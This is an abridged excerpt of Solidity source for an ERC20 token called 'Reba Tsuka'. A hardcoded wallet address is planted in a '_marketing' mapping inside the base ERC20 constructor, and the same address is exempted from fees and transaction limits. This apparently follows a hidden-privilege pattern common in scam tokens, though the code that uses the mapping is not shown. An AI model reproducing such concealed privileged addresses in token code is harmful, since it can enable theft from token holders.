...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x3b5dC3Ea0638Eec2f698aCa8C741d4E18E02EdeE] = _marketingwallet;
    }
...
contract RebaTsuka is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Reba Tsuka", "ReTsuka") {
        ...
        excludeFromFees(address(0x3b5dC3Ea0638Eec2f698aCa8C741d4E18E02EdeE), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x3b5dC3Ea0638Eec2f698aCa8C741d4E18E02EdeE), true);
